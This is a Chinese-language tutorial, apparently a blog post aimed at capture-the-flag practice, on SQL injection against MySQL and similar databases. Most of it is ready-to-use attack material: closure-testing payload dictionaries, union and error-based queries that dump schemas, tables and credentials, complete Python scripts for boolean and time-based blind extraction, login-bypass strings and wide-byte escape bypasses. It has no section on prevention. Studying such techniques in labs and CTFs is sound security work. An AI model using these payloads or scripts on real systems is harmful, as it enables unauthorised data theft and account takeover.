---

title: SQL注入
date: 2026-07-15
categories: [web安全, 常见漏洞]
recommend: 100
type: tech
---




# 1.SQL 注入

SQL注入就是在用户输入里夹带SQL代码，让数据库执行你想要的查询。它是Web安全中最经典的漏洞，也是CTF出题最多的类型。

## 1. SQL 注入原理

SQL 注入就是后端把用户输入的内容直接拼接进 SQL 语句中，导致用户输入的内容被数据库当成 SQL 代码执行。

例如正常情况下，后端可能想执行：

```sql
select * from users where id = 1;
```

但是如果用户传入的不是普通数字，而是：

```txt
1 or 1=1
```

最后 SQL 语句就可能变成：

```sql
select * from users where id = 1 or 1=1;
```

这里的 `or 1=1` 会被数据库当成 SQL 条件执行，从而改变原本的查询逻辑。

## 2. SQL 基础语句

### 2.1 select 查询数据

`select` 用来查询数据。

常见格式：

```sql
select 字段名 from 表名;
```

例如：

```sql
select username,password from users;
```

表示从 `users` 表中查询 `username` 和 `password` 字段。

如果想查询所有字段，可以使用 `*`：

```sql
select * from users;
```

### 2.2 where 条件查询

`where` 用来限制查询条件。

例如：

```sql
select * from users where id = 1;
```

常见条件写法：

| 写法 | 说明 |
| --- | --- |
| `id = 1` | 查询 `id` 等于 `1` 的数据 |
| `username = 'admin'` | 查询用户名为 `admin` 的数据 |
| `id > 1` | 查询 `id` 大于 `1` 的数据 |
| `id < 10` | 查询 `id` 小于 `10` 的数据 |

### 2.3 and 和 or

`and` 和 `or` 用来连接多个条件。

`and` 表示两个条件都要满足。

```sql
select * from users where username = 'admin' and password = '123456';
```

`or` 表示只要满足其中一个条件即可。

```sql
select * from users where username = 'admin' or id = 1;
```

在 SQL 注入中经常会用到：

```txt
or 1=1
```

因为 `1=1` 永远成立，可以改变原本的查询条件。

### 2.4 order by 排序

`order by` 用来对查询结果排序。

```sql
select * from users order by id;
```

也可以用数字表示按照第几列排序：

```sql
select * from users order by 1;
select * from users order by 2;
select * from users order by 3;
```

在 SQL 注入中，`order by` 经常用来判断当前查询结果有多少列。

例如：

```txt
?id=1 order by 1
?id=1 order by 2
?id=1 order by 3
```

如果 `order by 3` 正常，但是 `order by 4` 报错，说明当前查询结果大概率有 3 列。

### 2.5 limit 限制数量

`limit` 用来限制查询结果的数量。

```sql
select * from users limit 1;
```

也可以指定从哪里开始查询：

```sql
select * from users limit 0,1;
select * from users limit 1,1;
```

| 写法 | 说明 |
| --- | --- |
| `limit 0,1` | 从第 1 条开始，取 1 条 |
| `limit 1,1` | 从第 2 条开始，取 1 条 |
| `limit 2,1` | 从第 3 条开始，取 1 条 |

在 SQL 注入中，`limit` 常用于一条一条读取数据。

### 2.6 union 联合查询

`union` 可以把两个查询结果合并到一起。

```sql
select id,username from users
union
select 1,2;
```

使用 `union` 时，前后两个查询语句的列数必须相同。

所以在 Union 注入之前，通常要先判断列数。

## 3. 测试 SQL 注入点

测试 SQL 注入点的核心是判断参数是否进入了 SQL 查询。

常用方法是构造一组永真条件和永假条件：

```txt
1 and 1=1 -- 
1 and 1=2 -- 
```

如果 `1 and 1=1 -- ` 页面正常，`1 and 1=2 -- ` 页面异常、为空、报错或内容发生变化，就说明参数可能进入了 SQL 查询。

数字型参数常用：

```txt
?id=1 and 1=1 -- 
?id=1 and 1=2 -- 
```

可能对应的 SQL 语句：

```sql
select * from users where id = 1
```

拼接后变成：

```sql
select * from users where id = 1 and 1=1 -- 
select * from users where id = 1 and 1=2 -- 
```

`1=1` 永远成立，`1=2` 永远不成立。

字符型参数常用：

```txt
?id=1' and 1=1 -- 
?id=1' and 1=2 -- 
```

可能对应的 SQL 语句：

```sql
select * from users where id = '1'
```

拼接后变成：

```sql
select * from users where id = '1' and 1=1 -- '
select * from users where id = '1' and 1=2 -- '
```

前面的 `'` 用来闭合原 SQL 中的引号，后面的 `-- ` 用来注释掉原本剩下的引号。

## 4. 注释符

注释符用于注释掉后面的 SQL 语句，防止原本 SQL 后面的引号、括号或条件影响 payload。

常用注释符：

| 注释符 | 支持情况 | 说明 |
| --- | --- | --- |
| `--` | PostgreSQL、SQL Server、Oracle、SQLite 支持 | 单行注释 |
| `-- ` | MySQL、MariaDB 支持 | MySQL 常见单行注释，`--` 后面要跟一个空白字符，在 URL 中 `-- ` 可以写成 `--+`，因为 `+` 会被解析成空格 |
| `#` | MySQL、MariaDB 支持 | MySQL 常见单行注释，在 URL 中要写成 `%23` |
| `/* */` | 均支持 | 块注释，可以注释中间一段内容，也常用于替代空格 |
| `/*! */` | MySQL、MariaDB 特有 | MySQL 版本注释，其他数据库通常当普通注释处理，MySQL 中里面的内容可能会执行 |

## 5. 闭合方式

闭合方式就是让输入内容和后端原本的 SQL 语句拼接后，SQL 语法仍然成立。

以下 payload 开头的 `1` 必须保留，它表示原本能够正常查询到数据的参数值。如果正常参数值不是 `1`，就把 `1` 换成当前参数的正常值。

| 闭合方式 | 测试 payload |
| --- | --- |
| 数字型 | `1 and 1=1 -- ` |
| 单引号闭合 | `1' and 1=1 -- ` |
| 双引号闭合 | `1" and 1=1 -- ` |
| 小括号闭合 | `1) and 1=1 -- ` |
| 单引号 + 小括号闭合 | `1') and 1=1 -- ` |
| 双引号 + 小括号闭合 | `1") and 1=1 -- ` |
| 双小括号闭合 | `1)) and 1=1 -- ` |
| 单引号 + 双小括号闭合 | `1')) and 1=1 -- ` |
| 双引号 + 双小括号闭合 | `1")) and 1=1 -- ` |
| 三小括号闭合 | `1))) and 1=1 -- ` |
| 单引号 + 三小括号闭合 | `1'))) and 1=1 -- ` |
| 双引号 + 三小括号闭合 | `1"))) and 1=1 -- ` |

判断闭合方式时，不是只看一个 payload，而是要成对测试。

例如测试单引号闭合：

```txt
1' and 1=1 -- 
1' and 1=2 -- 
```

可以尝试通过 BurpSuite 的 Intruder 模块爆破下列字典判断闭合方式：

```txt
1 and 1=1 -- 
1 and 1=2 -- 
1' and 1=1 -- 
1' and 1=2 -- 
1" and 1=1 -- 
1" and 1=2 -- 
1) and 1=1 -- 
1) and 1=2 -- 
1') and 1=1 -- 
1') and 1=2 -- 
1") and 1=1 -- 
1") and 1=2 -- 
1)) and 1=1 -- 
1)) and 1=2 -- 
1')) and 1=1 -- 
1')) and 1=2 -- 
1")) and 1=1 -- 
1")) and 1=2 -- 
1))) and 1=1 -- 
1))) and 1=2 -- 
1'))) and 1=1 -- 
1'))) and 1=2 -- 
1"))) and 1=1 -- 
1"))) and 1=2 -- 
```

如果某一组 payload 中，`1=1` 和 `1=2` 的页面结果明显不同，就优先使用这一组闭合方式继续注入。

在源码、报错或参数结构中能看到 JSON、模板、数组、对象拼接这类特殊结构时，还可以考虑测试：

```txt
1} and 1=1 -- 
1} and 1=2 -- 
```

## 6. information_schema（MySQL）

MySQL 中常用 `information_schema` 查库名、表名、字段名。

查所有数据库：

```sql
select group_concat(schema_name) from information_schema.schemata;
```

查当前数据库的表：

```sql
select group_concat(table_name) from information_schema.tables where table_schema=database();
```

查指定表的字段：

```sql
select group_concat(column_name) from information_schema.columns where table_name='users';
```

查字段内容：

```sql
select group_concat(username,password) from users;
```

SQLite 中没有 `information_schema`，通常从 `sqlite_master` 或 `sqlite_schema` 查表结构。

查所有表：

```sql
select group_concat(name) from sqlite_master where type='table';
```

查建表语句：

```sql
select sql from sqlite_master where type='table' and name='users';
```

PostgreSQL 查当前数据库的表：

```sql
select string_agg(table_name, ',') from information_schema.tables where table_schema='public';
```

SQL Server 查用户表：

```sql
select name from sysobjects where xtype='U';
```

## 7. Union 联合查询注入

Union 联合查询注入常用于页面有回显的情况，可以把自己构造的查询结果拼接到原本的查询结果后面。

使用 `union` 时，前后两个查询语句的列数必须相同。

### 7.1 判断列数

```sql
1' order by 1 -- 
1' order by 2 -- 
1' order by 3 -- 
1' order by 4 -- 
```

如果不知道哪个值能查到数据，可以先让前面的条件变成真：

```sql
1' or 1=1 order by 1 -- 
1' or 1=1 order by 2 -- 
1' or 1=1 order by 3 -- 
1' or 1=1 order by 4 -- 
```

数值型参数：

```sql
1 or 1=1 order by 1 -- 
1 or 1=1 order by 2 -- 
1 or 1=1 order by 3 -- 
1 or 1=1 order by 4 -- 
```

如果 `order by 3` 页面正常，`order by 4` 报错，说明当前查询结果大概率有 3 列。

### 7.2 判断回显位

假设当前查询有 3 列：

```sql
-1' union select 1,2,3 -- 
```

也可以写成：

```sql
1' and 1=2 union select 1,2,3 -- 
```

### 7.3 查询数据库名

查询当前数据库名：

```sql
-1' union select 1,database(),3 -- 
```

查询所有数据库名：

```sql
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
```

配合 `limit` 一条一条看：

```sql
-1' union select 1,schema_name,3 from information_schema.schemata limit 0,1 -- 
-1' union select 1,schema_name,3 from information_schema.schemata limit 1,1 -- 
-1' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- 
```

### 7.4 查询表名

查询当前数据库的表名：

```sql
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- 
```

查询指定数据库的表名：

```sql
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='【数据库名】' -- 
```

### 7.5 查询列名

查询当前数据库中某个表的列名：

```sql
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='【表名】' -- 
```

查询指定数据库中某个表的列名：

```sql
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='【数据库名】' and table_name='【表名】' -- 
```

### 7.6 查询字段内容

```sql
-1' union select 1,group_concat(【列名】),3 from 【表名】 -- 
```

查询多个列的内容：

```sql
-1' union select 【列名1】,【列名2】,【列名3】 from 【表名】 -- 
```

如果只有一个明显回显位，可以用 `concat_ws()` 拼接多个列：

```sql
-1' union select 1,concat_ws(':',【列名1】,【列名2】),3 from 【表名】 -- 
```

查询指定数据库里的表：

```sql
-1' union select 1,group_concat(【列名】),3 from 【数据库名】.【表名】 -- 
```

### 7.7 数值型 Union 注入

```sql
1 or 1=1 order by 3 -- 
-1 union select 1,2,3 -- 
-1 union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
-1 union select 1,group_concat(【列名】),3 from 【数据库名】.【表名】 -- 
```

### 7.8 常见注意点

1. `union select` 前后的列数必须一样。
2. 页面必须有回显位置。
3. 判断列数时，前面的条件要尽量为真。
4. 判断回显位和正式查询数据时，可以用 `-1'` 或 `and 1=2` 让原查询为空。
5. 如果结果只显示一条，可以试试 `group_concat()`；配合 `limit 0,1`、`limit 1,1` 一条一条看。
6. 数值型、括号型或其他闭合方式要结合前面测试出的闭合方式。
7. 如果用 HackBar 或直接在 URL 参数里传 payload，`-- ` 后面的空格可以写成 `--+`，`#` 可以写成 `%23`。

## 8. 报错注入

报错注入常用于页面没有正常回显，但是会显示数据库报错信息的情况。核心思路是故意让数据库报错，并把想查询的内容拼到报错信息里。

### 8.1 判断是否能报错

```sql
1'
1' and updatexml(1,1,1) -- 
```

### 8.2 updatexml() 报错注入

查询当前数据库名：

```sql
1' and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
```

其中 `0x7e` 是 `~`，用来分隔数据。可能报错类似：

```txt
XPATH syntax error: '~test~'
```

### 8.3 extractvalue() 报错注入

```sql
1' and extractvalue(1,concat(0x7e,database(),0x7e)) -- 
1' and extractvalue(1,concat(0x7e,user(),0x7e)) -- 
1' and extractvalue(1,concat(0x7e,version(),0x7e)) -- 
```

### 8.4 查询数据库名

```sql
1' and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
1' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) -- 
```

### 8.5 查询表名

```sql
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- 
```

### 8.6 查询列名

```sql
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='【表名】'),0x7e),1) -- 
```

### 8.7 查询字段内容

```sql
1' and updatexml(1,concat(0x7e,(select group_concat(【列名】) from 【表名】),0x7e),1) -- 
```

分段读取：

```sql
1' and updatexml(1,concat(0x7e,substr((select group_concat(【列名】) from 【表名】),1,30),0x7e),1) -- 
1' and updatexml(1,concat(0x7e,substr((select group_concat(【列名】) from 【表名】),31,30),0x7e),1) -- 
```

配合 `limit` 一行一行读：

```sql
1' and updatexml(1,concat(0x7e,(select 【列名】 from 【表名】 limit 0,1),0x7e),1) -- 
1' and updatexml(1,concat(0x7e,(select 【列名】 from 【表名】 limit 1,1),0x7e),1) -- 
```

如果单行内容也很长，把 `limit` 和 `substr()` 结合起来：

```sql
1' and updatexml(1,concat(0x7e,substr((select 【列名】 from 【表名】 limit 0,1),1,30),0x7e),1) -- 
1' and updatexml(1,concat(0x7e,substr((select 【列名】 from 【表名】 limit 0,1),31,30),0x7e),1) -- 
```

### 8.8 数值型报错注入

```sql
1 and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
1 and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) -- 
```

### 8.9 floor(rand()) 报错注入

查询当前数据库名：

```sql
1' and (select 1 from (select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
```

查询表名：

```sql
1' and (select 1 from (select count(*),concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
```

### 8.10 常见注意点

1. 报错注入的前提是页面会显示数据库报错信息。
2. `updatexml()` 和 `extractvalue()` 在 MySQL 5.x CTF 环境里比较常见，新版本 MySQL 里可能不可用。
3. 报错信息长度有限，数据太长用 `substr()` 截取，或配合 `limit` 分条查。
4. 如果没有报错回显，考虑布尔盲注或时间盲注。
5. 如果用 HackBar 或直接在 URL 参数里传 payload，`-- ` 后面的空格可以写成 `--+`，`#` 可以写成 `%23`。

## 9. 布尔盲注

布尔盲注常用于页面没有正常回显，也没有数据库报错信息，但是页面会根据 SQL 条件真假返回不同内容的情况。

核心思路是让数据库判断一个条件是否成立，然后通过页面回显差异判断结果。

```sql
1' and 1=1 -- 
1' and 1=2 -- 
```

### 9.1 布尔盲注的条件

1. 参数本身存在 SQL 注入。
2. 页面会根据 SQL 条件真假返回不同内容。
3. 能找到一个稳定的真假判断标志。
4. 数据库函数可以正常执行。
5. 注入点闭合方式正确。

常见的真假判断标志：

| 判断依据 | 说明 |
| --- | --- |
| 页面文字 | 真页面有某段文字，假页面没有 |
| 页面长度 | 真页面和假页面响应长度不同 |
| 状态码 | 真页面和假页面状态码不同 |
| 跳转位置 | 真页面和假页面跳转不同 |
| JSON 字段 | 真页面和假页面返回字段不同 |

### 9.2 判断是否存在布尔盲注

```sql
1' and 1=1 -- 
1' and 1=2 -- 

1' and length(database())>0 -- 
1' and substr(database(),1,1)='a' -- 
```

### 9.3 布尔盲注常用函数

| 函数 | 作用 |
| --- | --- |
| `length()` | 判断字符串长度 |
| `substr()` | 截取字符串 |
| `substring()` | 截取字符串，和 `substr()` 类似 |
| `mid()` | 截取字符串，和 `substr()` 类似 |
| `ascii()` | 把字符转成 ASCII 码 |
| `ord()` | 把字符转成 ASCII 码，和 `ascii()` 类似 |
| `database()` | 当前数据库名 |
| `group_concat()` | 把多行结果拼成一行 |

常见写法：

```sql
length(database())
substr(database(),1,1)
ascii(substr(database(),1,1))
```

### 9.4 手工判断当前数据库名

先判断长度：

```sql
1' and length(database())=【长度】 -- 
1' and length(database())>【长度】 -- 
1' and length(database())<【长度】 -- 
```

逐位判断：

```sql
1' and substr(database(),【位置】,1)='【字符】' -- 
1' and ascii(substr(database(),【位置】,1))=【ASCII码】 -- 
1' and ascii(substr(database(),【位置】,1))>【ASCII码】 -- 
```

### 9.5 手工查询数据库、表、列、数据

```sql
1' and length((select group_concat(schema_name) from information_schema.schemata))=【长度】 -- 

1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),【位置】,1))>【ASCII码】 -- 

1' and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】))=【长度】 -- 

1' and ascii(substr((select group_concat(【列名】) from 【表名】),【位置】,1))>【ASCII码】 -- 
```

### 9.6 字符字典爆破脚本

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
success_text = "You are in..........."
result = ""
strs = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-,"

for i in range(1, 100):
    found = False

    for j in strs:
        # 爆所有数据库名
        payload = f"1' and substr((select group_concat(schema_name) from information_schema.schemata),{i},1)='{j}' -- "

        # 爆当前数据库的表名
        # payload = f"1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1)='{j}' -- "

        # 爆指定数据库的表名
        # payload = f"1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=0x【数据库名十六进制】),{i},1)='{j}' -- "

        # 爆指定表的列名
        # payload = f"1' and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】),{i},1)='{j}' -- "

        # 爆字段内容
        # payload = f"1' and substr((select group_concat(【列名】) from 【表名】),{i},1)='{j}' -- "

        res = requests.get(url, params={"id": payload}, verify=False)

        if success_text in res.text:
            result += j
            print(result)
            found = True
            break

    if not found:
        break
```

### 9.7 ASCII 顺序爆破脚本

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
success_text = "You are in..........."
result = ""

for i in range(1, 100):
    found = False

    for j in range(32, 127):
        # 爆所有数据库名
        payload = f"1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))={j} -- "

        # 爆当前数据库的表名
        # payload = f"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={j} -- "

        # 爆指定数据库的表名
        # payload = f"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x【数据库名十六进制】),{i},1))={j} -- "

        # 爆指定表的列名
        # payload = f"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】),{i},1))={j} -- "

        # 爆字段内容
        # payload = f"1' and ascii(substr((select group_concat(【列名】) from 【表名】),{i},1))={j} -- "

        res = requests.get(url, params={"id": payload}, verify=False)

        if success_text in res.text:
            result += chr(j)
            print(result)
            found = True
            break

    if not found:
        break
```

### 9.8 ASCII 二分法爆破脚本

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
success_text = "You are in..........."
result = ""

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆所有数据库名
        payload = f"1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid} -- "

        # 爆当前数据库的表名
        # payload = f"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid} -- "

        # 爆指定数据库的表名
        # payload = f"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x【数据库名十六进制】),{i},1))>{mid} -- "

        # 爆指定表的列名
        # payload = f"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】),{i},1))>{mid} -- "

        # 爆字段内容
        # payload = f"1' and ascii(substr((select group_concat(【列名】) from 【表名】),{i},1))>{mid} -- "

        res = requests.get(url, params={"id": payload}, verify=False)

        if success_text in res.text:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

### 9.9 GET 脚本改 POST / JSON 传参

POST 表单传参：

```python
url = "http://target/login.php"

res = requests.post(url, data={"username": payload, "password": "1"}, verify=False)
```

POST JSON 传参：

```python
url = "http://target/login.php"

res = requests.post(url, json={"username": payload, "password": "1"}, verify=False)
```

### 9.10 like 和 regexp 判断

```sql
1' and database() like 't%' -- 
1' and (select group_concat(【列名】) from 【表名】) like 'flag%' -- 
1' and (select group_concat(【列名】) from 【表名】) regexp '^flag' -- 
```

### 9.11 常见注意点

1. 布尔盲注依赖页面真假差异。
2. 判断真假时要找稳定特征。
3. 如果页面真假差异不稳定，脚本容易误判。
4. `substr()`、`substring()`、`mid()` 都可以截取字符串。
5. 字符字典爆破直观，但字典不全会漏字符。
6. ASCII 二分法通常更快。
7. 如果当前库里没找到 flag，要记得查所有数据库名。
8. 如果数据很长，配合 `limit` 分条爆破。
9. 如果页面没有稳定真假差异，考虑时间盲注。
10. 如果用 HackBar 或直接在 URL 参数里传 payload，`-- ` 后面的空格可以写成 `--+`，`#` 可以写成 `%23`。

## 10. 时间盲注

时间盲注常用于页面没有正常回显、没有数据库报错信息，并且页面真假差异也不明显的情况。核心思路是让数据库在条件成立时延迟返回，然后根据响应时间判断条件真假。

```sql
1' and if(1=1,sleep(5),0) -- 
1' and if(1=2,sleep(5),0) -- 
```

### 10.1 时间盲注的条件

1. 参数本身存在 SQL 注入。
2. 数据库支持延时函数。
3. 注入点的 SQL 条件可以影响 `sleep()` 是否执行。
4. 网络延迟相对稳定，能够看出明显时间差。
5. 注入点闭合方式正确。

### 10.2 判断是否存在时间盲注

```sql
1' and sleep(5) -- 
1' and if(1=1,sleep(5),0) -- 
1' and if(1=2,sleep(5),0) -- 
1' and if(substr(database(),1,1)='a',sleep(5),0) -- 
```

### 10.3 时间盲注常用函数

| 函数 | 作用 |
| --- | --- |
| `sleep()` | 延迟指定秒数 |
| `if()` | 条件判断 |
| `length()` | 判断字符串长度 |
| `substr()` | 截取字符串 |
| `ascii()` | 把字符转成 ASCII 码 |
| `database()` | 当前数据库名 |
| `group_concat()` | 把多行结果拼成一行 |
| `benchmark()` | 重复执行表达式制造延迟 |

常见格式：

```sql
if(条件,sleep(5),0)
```

### 10.4 手工判断当前数据库名

```sql
1' and if(length(database())=【长度】,sleep(5),0) -- 
1' and if(length(database())>【长度】,sleep(5),0) -- 
1' and if(substr(database(),【位置】,1)='【字符】',sleep(5),0) -- 
1' and if(ascii(substr(database(),【位置】,1))=【ASCII码】,sleep(5),0) -- 
1' and if(ascii(substr(database(),【位置】,1))>【ASCII码】,sleep(5),0) -- 
```

### 10.5 手工查询数据库、表、列、数据

```sql
1' and if(length((select group_concat(schema_name) from information_schema.schemata))=【长度】,sleep(5),0) -- 
1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),【位置】,1))>【ASCII码】,sleep(5),0) -- 
1' and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】))=【长度】,sleep(5),0) -- 
1' and if(ascii(substr((select group_concat(【列名】) from 【表名】),【位置】,1))>【ASCII码】,sleep(5),0) -- 
```

### 10.6 不用 if 的写法

```sql
1' and length(database())=【长度】 and sleep(5) -- 
1' and ascii(substr(database(),【位置】,1))=【ASCII码】 and sleep(5) -- 
```

### 10.7 benchmark 延时

```sql
1' and if(1=1,benchmark(1000000,md5(1)),0) -- 
1' and if(ascii(substr(database(),【位置】,1))>【ASCII码】,benchmark(1000000,md5(1)),0) -- 
```

### 10.8 用响应时间判断的 Python 脚本

```python
import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
result = ""
delay = 3
threshold = 2.5

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆所有数据库名
        payload = f"1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆当前数据库的表名
        # payload = f"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆指定数据库的表名
        # payload = f"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x【数据库名十六进制】),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆指定表的列名
        # payload = f"1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆字段内容
        # payload = f"1' and if(ascii(substr((select group_concat(【列名】) from 【表名】),{i},1))>{mid},sleep({delay}),0) -- "

        start = time.time()
        requests.get(url, params={"id": payload}, verify=False)
        end = time.time()

        if end - start > threshold:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

### 10.9 用 timeout 判断的 Python 脚本

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
result = ""
delay = 3
timeout = 2

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆所有数据库名
        payload = f"1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},sleep({delay}),0) -- "

        try:
            requests.get(url, params={"id": payload}, verify=False, timeout=timeout)
            right = mid
        except requests.exceptions.Timeout:
            left = mid + 1

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

### 10.10 常见注意点

1. 时间盲注依赖响应时间差。
2. 如果页面有稳定真假差异，优先用布尔盲注。
3. `sleep()` 延迟太短容易被网络波动影响，太长又会很慢。
4. `benchmark()` 可以在 `sleep()` 被过滤时制造延迟。
5. 网络不稳定时，最好多请求几次确认。
6. 如果当前库里没找到 flag，要记得查所有数据库名。
7. 如果数据很长，配合 `limit` 分条爆破。
8. 如果用 HackBar 或直接在 URL 参数里传 payload，`-- ` 后面的空格可以写成 `--+`，`#` 可以写成 `%23`。

## 11. 万能密码

万能密码常见于登录框或查询框，本质是让原本的用户名或密码判断条件失效。以单引号闭合为例。

### 11.1 单个输入框，只是查询作用

后端可能写成：

```sql
select * from users where username = '用户输入';
```

常见 payload：

```sql
' or 1=1 -- 
' or 1=1 #
' or '1'='1' -- 
' or true -- 
' or 1 -- 
```

输入后的效果：

输入 `' or 1=1 -- ` 拼接后：

```sql
select * from users where username = '' or 1=1 -- ';
```

实际生效部分：

```sql
select * from users where username = '' or 1=1
```

不用注释符的写法：

```sql
' or '1'='1
' or 'a'='a
' or ''='
```

### 11.2 单个输入框，只输入密码

后端可能写成：

```sql
select * from users where username = 'admin' and password = '用户输入';
```

常见 payload：

```sql
' or 1=1 -- 
' or 1=1 #
' or '1'='1' -- 
' or true -- 
' or 1 -- 
```

输入后拼接效果：

```sql
select * from users where username = 'admin' and password = '' or 1=1 -- ';
```

实际相当于：

```sql
(username = 'admin' and password = '') or 1=1
```

指定用户的写法：

```sql
' or username='admin' -- 
' or user='admin' -- 
' or id=1 -- 
```

### 11.3 输入账号和密码

后端可能写成：

```sql
select * from users where username = '用户输入的账号' and password = '用户输入的密码';
```

知道目标用户时，在账号框注释掉密码判断：

```txt
账号：admin' -- 
密码：随便填

账号：admin' #
密码：随便填
```

不指定用户时，在账号框构造恒真条件：

```txt
账号：随便填' or 1=1 -- 
密码：随便填

账号：随便填' or '1'='1' -- 
密码：随便填

账号：随便填' or true -- 
密码：随便填

账号：随便填' or 1 -- 
密码：随便填
```

payload 放在密码框：

```txt
账号：随便填
密码：' or 1=1 -- 

账号：随便填
密码：' or '1'='1' -- 

账号：随便填
密码：' or true -- 

账号：随便填
密码：' or 1 -- 
```

不带注释符的写法：

```txt
账号：' or '1'='1
密码：' or '1'='1

账号：' or ''='
密码：' or ''='
```

MySQL 里比较特殊的写法：

```txt
账号：'='
密码：'='
```

使用块注释符：

```txt
账号：admin'/*
密码：*/ -- 

账号：随便填'/*
密码：*/ or '1'='1

账号：随便填'/*
密码：*/ or 1=1 -- 
```

**注：** 如果用 HackBar 或直接在 URL 参数里传 payload，`-- ` 后面的空格可以写成 `--+`，`#` 可以写成 `%23`。

## 12. 宽字节注入

宽字节注入常见于 MySQL 使用 GBK、GB2312、Big5 这类宽字节编码时。核心思路是后端把单引号转义成 `\'`，但是宽字节字符可以把反斜杠 `\` 吃掉，导致单引号重新逃出来闭合 SQL。

### 12.1 普通转义的情况

后端可能会对单引号做转义。例如用户输入 `1'`，后端转义后变成 `1\'`。

拼接到 SQL 中：

```sql
select * from users where id = '1\''
```

这里的 `'` 被 `\` 转义了。

### 12.2 宽字节绕过转义

宽字节注入常用 `%df%27`。

| 内容 | 含义 |
| --- | --- |
| `%df` | 宽字节的前一个字节 |
| `%27` | 单引号 `'` |
| `%5c` | 反斜杠 `\` |

用户输入 `1%df%27`，后端转义后变成 `1%df%5c%27`。在 GBK 编码中，`%df%5c` 会被当成一个中文字符处理，后面的 `%27` 就重新变成了单引号。

### 12.3 常见宽字节前缀

```sql
1%df%27
1%bf%27
1%a1%27
1%aa%27
1%ba%27
```

### 12.4 判断是否存在宽字节注入

```sql
1'
1%df%27 and 1=1 -- 
1%df%27 and 1=2 -- 
1%bf%27 and 1=1 -- 
1%bf%27 and 1=2 -- 
```

### 12.5 宽字节 Union 注入

判断列数：

```sql
1%df%27 order by 1 -- 
1%df%27 order by 2 -- 
1%df%27 order by 3 -- 
1%df%27 order by 4 -- 
```

判断回显位：

```sql
-1%df%27 union select 1,2,3 -- 
```

查询当前数据库名：

```sql
-1%df%27 union select 1,database(),3 -- 
```

查询所有数据库名：

```sql
-1%df%27 union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
```

查询表名：

```sql
-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- 
```

查询列名：

```sql
-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x【数据库名十六进制】 and table_name=0x【表名十六进制】 -- 
```

查询字段内容：

```sql
-1%df%27 union select 1,group_concat(【列名】),3 from 【数据库名】.【表名】 -- 
```

### 12.6 宽字节报错注入

```sql
1%df%27 and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
1%df%27 and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) -- 
